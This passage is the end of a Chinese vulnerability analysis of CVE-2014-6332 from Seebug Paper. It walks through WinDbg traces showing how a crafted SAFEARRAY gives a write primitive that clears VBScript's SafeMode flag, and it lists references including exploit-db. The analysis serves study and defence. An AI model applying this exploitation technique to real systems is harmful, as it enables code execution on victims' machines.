   <span class="o">+</span><span class="mh">0x004</span> <span class="n">cbElements</span>       <span class="o">:</span> <span class="mh">0x10</span>
   <span class="o">+</span><span class="mh">0x008</span> <span class="n">cLocks</span>           <span class="o">:</span> <span class="mi">0</span>
   <span class="o">+</span><span class="mh">0x00c</span> <span class="n">pvData</span>           <span class="o">:</span> <span class="mh">0x02e678f0</span> <span class="n">Void</span>
   <span class="o">+</span><span class="mh">0x010</span> <span class="n">rgsabound</span>        <span class="o">:</span> <span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="n">tagSAFEARRAYBOUND</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">g</span>
<span class="n">Breakpoint</span> <span class="mi">2</span> <span class="n">hit</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">0249</span><span class="n">cd70</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">0249</span><span class="n">ceb4</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">0249</span><span class="n">ceb4</span> <span class="n">edx</span><span class="o">=</span><span class="mi">0000400</span><span class="n">c</span> <span class="n">esi</span><span class="o">=</span><span class="mi">00000001</span> <span class="n">edi</span><span class="o">=</span><span class="mi">01</span><span class="n">e00900</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">6</span><span class="n">fb11f4c</span> <span class="n">esp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cd44</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cd5c</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">vbscript</span><span class="o">!</span><span class="n">AccessArray</span><span class="o">:</span>
<span class="mi">6</span><span class="n">fb11f4c</span> <span class="mi">8</span><span class="n">bff</span>            <span class="n">mov</span>     <span class="n">edi</span><span class="o">,</span><span class="n">edi</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="n">esp</span> <span class="n">L8</span>
<span class="mi">0249</span><span class="n">cd44</span>  <span class="mi">6</span><span class="n">fb12028</span> <span class="mi">0249</span><span class="n">ce54</span> <span class="mi">0013</span><span class="n">f23c</span> <span class="mi">00000001</span>
<span class="mi">0249</span><span class="n">cd54</span>  <span class="mi">01</span><span class="n">df8500</span> <span class="mi">0249</span><span class="n">cd70</span> <span class="mi">0249</span><span class="n">ce5c</span> <span class="mi">6</span><span class="n">fb0dc01</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">gu</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">0249</span><span class="n">ceb4</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">0249</span><span class="n">ce54</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00000060</span> <span class="n">esi</span><span class="o">=</span><span class="mi">00000001</span> <span class="n">edi</span><span class="o">=</span><span class="mi">01</span><span class="n">e00900</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">6</span><span class="n">fb12028</span> <span class="n">esp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cd5c</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cd5c</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">vbscript</span><span class="o">!</span><span class="n">CScriptRuntime</span><span class="o">::</span><span class="n">LockArray</span><span class="o">+</span><span class="mh">0x1a</span><span class="o">:</span>
<span class="mi">6</span><span class="n">fb12028</span> <span class="mi">85</span><span class="n">c0</span>            <span class="n">test</span>    <span class="n">eax</span><span class="o">,</span><span class="n">eax</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="n">poi</span><span class="o">(</span><span class="mi">0249</span><span class="n">ce54</span><span class="o">)</span> <span class="n">L4</span>
<span class="mi">02</span><span class="n">e67918</span>  <span class="mi">0000200</span><span class="n">c</span> <span class="mi">0000200</span><span class="n">c</span> <span class="mi">00405014</span> <span class="mi">0249</span><span class="n">cc18</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">dt</span> <span class="n">ole32</span><span class="o">!</span><span class="n">tagSAFEARRAY</span> <span class="n">poi</span><span class="o">(</span><span class="mi">0249</span><span class="n">cd70</span><span class="o">)</span>
   <span class="o">+</span><span class="mh">0x000</span> <span class="n">cDims</span>            <span class="o">:</span> <span class="mi">1</span>
   <span class="o">+</span><span class="mh">0x002</span> <span class="n">fFeatures</span>        <span class="o">:</span> <span class="mh">0x880</span>
   <span class="o">+</span><span class="mh">0x004</span> <span class="n">cbElements</span>       <span class="o">:</span> <span class="mh">0x10</span>
   <span class="o">+</span><span class="mh">0x008</span> <span class="n">cLocks</span>           <span class="o">:</span> <span class="mi">0</span>
   <span class="o">+</span><span class="mh">0x00c</span> <span class="n">pvData</span>           <span class="o">:</span> <span class="mh">0x02e66ec8</span> <span class="n">Void</span>
   <span class="o">+</span><span class="mh">0x010</span> <span class="n">rgsabound</span>        <span class="o">:</span> <span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="n">tagSAFEARRAYBOUND</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">g</span>
<span class="n">Breakpoint</span> <span class="mi">2</span> <span class="n">hit</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">0249</span><span class="n">ce54</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">0249</span><span class="n">ceb4</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">01</span><span class="n">df8500</span> <span class="n">edx</span><span class="o">=</span><span class="mi">0000400</span><span class="n">c</span> <span class="n">esi</span><span class="o">=</span><span class="mi">00000001</span> <span class="n">edi</span><span class="o">=</span><span class="mi">00000010</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">6</span><span class="n">fb11f4c</span> <span class="n">esp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cd5c</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">0249</span><span class="n">ce5c</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">vbscript</span><span class="o">!</span><span class="n">AccessArray</span><span class="o">:</span>
<span class="mi">6</span><span class="n">fb11f4c</span> <span class="mi">8</span><span class="n">bff</span>            <span class="n">mov</span>     <span class="n">edi</span><span class="o">,</span><span class="n">edi</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="n">esp</span> <span class="n">L8</span>
<span class="mi">0249</span><span class="n">cd5c</span>  <span class="mi">6</span><span class="n">fb0255c</span> <span class="mi">0249</span><span class="n">ce54</span> <span class="mi">01</span><span class="n">df8500</span> <span class="mi">00000001</span>
<span class="mi">0249</span><span class="n">cd6c</span>  <span class="mi">01</span><span class="n">df84f0</span> <span class="mi">00000000</span> <span class="mi">0249</span><span class="n">d070</span> <span class="mi">0249</span><span class="n">ceb4</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="mi">01</span><span class="n">df8500</span> <span class="n">L4</span>
<span class="mi">01</span><span class="n">df8500</span>  <span class="mi">0000400</span><span class="n">c</span> <span class="mi">00000000</span> <span class="mi">02</span><span class="n">e67918</span> <span class="mi">00000000</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="mi">02</span><span class="n">e67918</span> <span class="n">L4</span>
<span class="mi">02</span><span class="n">e67918</span>  <span class="mi">0000200</span><span class="n">c</span> <span class="mi">0000200</span><span class="n">c</span> <span class="mi">00405014</span> <span class="mi">0249</span><span class="n">cc18</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="mi">00405014</span> <span class="n">L6</span>
<span class="mi">00405014</span>  <span class="mi">08800001</span> <span class="mi">00000001</span> <span class="mi">00000000</span> <span class="mi">00000000</span>
<span class="mi">00405024</span>  <span class="mi">7</span><span class="n">fff0000</span> <span class="mi">00000000</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">dt</span> <span class="n">ole32</span><span class="o">!</span><span class="n">tagSAFEARRAY</span> <span class="mi">00405014</span>
   <span class="o">+</span><span class="mh">0x000</span> <span class="n">cDims</span>            <span class="o">:</span> <span class="mi">1</span>
   <span class="o">+</span><span class="mh">0x002</span> <span class="n">fFeatures</span>        <span class="o">:</span> <span class="mh">0x880</span>
   <span class="o">+</span><span class="mh">0x004</span> <span class="n">cbElements</span>       <span class="o">:</span> <span class="mi">1</span>
   <span class="o">+</span><span class="mh">0x008</span> <span class="n">cLocks</span>           <span class="o">:</span> <span class="mi">0</span>
   <span class="o">+</span><span class="mh">0x00c</span> <span class="n">pvData</span>           <span class="o">:</span> <span class="o">(</span><span class="kc">null</span><span class="o">)</span> 
   <span class="o">+</span><span class="mh">0x010</span> <span class="n">rgsabound</span>        <span class="o">:</span> <span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="n">tagSAFEARRAYBOUND</span>
</pre></div>


<p>可以看到，之前精心构造的SAFEARRAY结构在这里用到了，通过它可返回以索引值i+&amp;h11c+k为起始地址的Variant结构变量，即pvData+(i+&amp;h11c+k)*cbElements=i+&amp;h11c+k，因此可实现Write primitive，这里该索引值为0x01df7760：</p>
<div class="codehilite"><pre><span></span>......
0:005&gt; p
eax=01df7760 ebx=01df84f0 ecx=00000003 edx=00000003 esi=00405014 edi=00405024
eip=6fb11fe8 esp=0249cd3c ebp=0249cd58 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
vbscript!AccessArray+0xd6:
6fb11fe8 8b4604          mov     eax,dword ptr [esi+4] ds:0023:00405018=00000001
0:005&gt; 
eax=00000001 ebx=01df84f0 ecx=00000003 edx=00000003 esi=00405014 edi=00405024
eip=6fb11feb esp=0249cd3c ebp=0249cd58 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
vbscript!AccessArray+0xd9:
6fb11feb 0faf450c        imul    eax,dword ptr [ebp+0Ch] ss:0023:0249cd64=01df7760
0:005&gt; 
eax=01df7760 ebx=01df84f0 ecx=00000003 edx=00000003 esi=00405014 edi=00405024
eip=6fb11fef esp=0249cd3c ebp=0249cd58 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
vbscript!AccessArray+0xdd:
6fb11fef 03460c          add     eax,dword ptr [esi+0Ch] ds:0023:00405020=00000000
0:005&gt; 
eax=01df7760 ebx=01df84f0 ecx=00000003 edx=00000003 esi=00405014 edi=00405024
eip=6fb11ff2 esp=0249cd3c ebp=0249cd58 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
vbscript!AccessArray+0xe0:
6fb11ff2 8b4d08          mov     ecx,dword ptr [ebp+8] ss:0023:0249cd60=0249ce54
0:005&gt; 
eax=01df7760 ebx=01df84f0 ecx=0249ce54 edx=00000003 esi=00405014 edi=00405024
eip=6fb11ff5 esp=0249cd3c ebp=0249cd58 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
vbscript!AccessArray+0xe3:
6fb11ff5 8901            mov     dword ptr [ecx],eax  ds:0023:0249ce54=01df8500
......
0:005&gt; dd poi(0249ce54) L4
01df7760  00000000 0000000e 00000000 00000000
0:005&gt; db 02e678e8 L20
02e678e8  ef 6a d2 68 6c 4b 02 08-02 00 00 00 00 00 00 00  .j.hlK..........
02e678f8  00 00 00 00 00 00 00 00-68 77 df 01 01 00 a0 41  ........hw.....A
</pre></div>


<p>再接着就是将前面获取的ab(4)赋给这个Variant结构变量：</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">g</span>
<span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">hit</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">01</span><span class="n">df8510</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">0249</span><span class="n">ceb4</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">0249</span><span class="n">ceb4</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00000003</span> <span class="n">esi</span><span class="o">=</span><span class="mi">00000001</span> <span class="n">edi</span><span class="o">=</span><span class="mi">00000010</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">6</span><span class="n">fb02e64</span> <span class="n">esp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cd60</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">0249</span><span class="n">ce5c</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">vbscript</span><span class="o">!</span><span class="n">AssignVar</span><span class="o">:</span>
<span class="mi">6</span><span class="n">fb02e64</span> <span class="mi">8</span><span class="n">bff</span>            <span class="n">mov</span>     <span class="n">edi</span><span class="o">,</span><span class="n">edi</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">g</span>
<span class="n">Breakpoint</span> <span class="mi">0</span> <span class="n">hit</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">0249</span><span class="n">cd58</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">004692</span><span class="n">e8</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00000060</span> <span class="n">esi</span><span class="o">=</span><span class="mi">01</span><span class="n">df8510</span> <span class="n">edi</span><span class="o">=</span><span class="mi">01</span><span class="n">e00900</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">7664</span><span class="n">ec2c</span> <span class="n">esp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cd44</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cd60</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">OLEAUT32</span><span class="o">!</span><span class="n">SafeArrayRedim</span><span class="o">:</span>
<span class="mi">7664</span><span class="n">ec2c</span> <span class="mi">8</span><span class="n">bff</span>            <span class="n">mov</span>     <span class="n">edi</span><span class="o">,</span><span class="n">edi</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="mi">01</span><span class="n">df7760</span> <span class="n">L4</span>
<span class="mi">01</span><span class="n">df7760</span>  <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span>
</pre></div>


<p>可以看到SafeMode标志被清零了，因此记事本也就能弹出来了。</p>
<h3>0x05 参考</h3>
<ul>
<li><a href="https://www.exploit-db.com/exploits/35229/">https://www.exploit-db.com/exploits/35229/</a><br/></li>
<li><a href="http://blog.vulnhunt.com/index.php/2014/11/18/about_cve-2014-6332/">http://blog.vulnhunt.com/index.php/2014/11/18/about_cve-2014-6332/</a> (web archive)<br/></li>
<li><a href="http://www.vxjump.net/files/vuln_analysis/a_cve-2014-6332.txt">http://www.vxjump.net/files/vuln_analysis/a_cve-2014-6332.txt</a><br/></li>
<li><a href="http://xteam.baidu.com/?p=104">http://xteam.baidu.com/?p=104</a><br/></li>
<li><a href="http://blog.trendmicro.com/trendlabs-security-intelligence/a-killer-combo-critical-vulnerability-and-godmode-exploitation-on-cve-2014-6332/">http://blog.trendmicro.com/trendlabs-security-intelligence/a-killer-combo-critical-vulnerability-and-godmode-exploitation-on-cve-2014-6332/</a></li>
</ul>
      
<hr>
<p><img src="https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg" alt="Paper" style="width: 220px">
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<a href="https://paper.seebug.org/240/">https://paper.seebug.org/240/</a></p>
            
    </section>

  <nav class="pagination" role="navigation" style="padding: 3rem;">
    
      <a class="newer-posts" href="/239/"><span aria-hidden="true">&larr;</span> Wordpress Username Enumerat...</a>
    
    
      <a class="older-posts" href="/241/">S2-045 原理初步分析（CVE-2017-5638） <span aria-hidden="true">&rarr;</span></a>
    
  </nav>


    

      
        <footer class="post-footer">
          <figure class="author-image">
            <a class="img" href="/users/author/?nickname=xd0ol1"
               style="background-image: url(https://images.seebug.org/uploads/2017/08/avatar.png)"><span
                class="hidden">'s Picture</span></a>
          </figure>

          <section class="author">
            <h4><a
                href="/users/author/?nickname=xd0ol1">xd0ol1</a>
            </h4>
            <p>阅读更多有关<a
                href="/users/author/?nickname=xd0ol1">该作者</a>的文章
            </p>
            
            <div class="author-meta">
            </div>
          </section>

          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          

        </footer>
      
    
    <br>
    <section class="plugin_comment">
    </section>

  </article>
  <section class="plugin_feedback"></section>


  </div>
</main>
</div>

<script type="text/javascript" src="/static/js/jquery.min.js"></script>
<script type="text/javascript" src="/static/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/static/js/index.js"></script>
<script type="text/javascript" src="/static/js/prism-loader.js"></script>
<script type="text/javascript" src="/static/js/prism.js"></script>
<script type="text/javascript" src="/static/js/jquery.ghostHunter.js"></script>
<script type="text/javascript" src="/static/js/js.cookie.js"></script>
<script type="text/javascript" src="/static/js/custom.js?t=20170821"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/comment_main.js"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/plugin_feedback.js"></script>
</body>

</html>
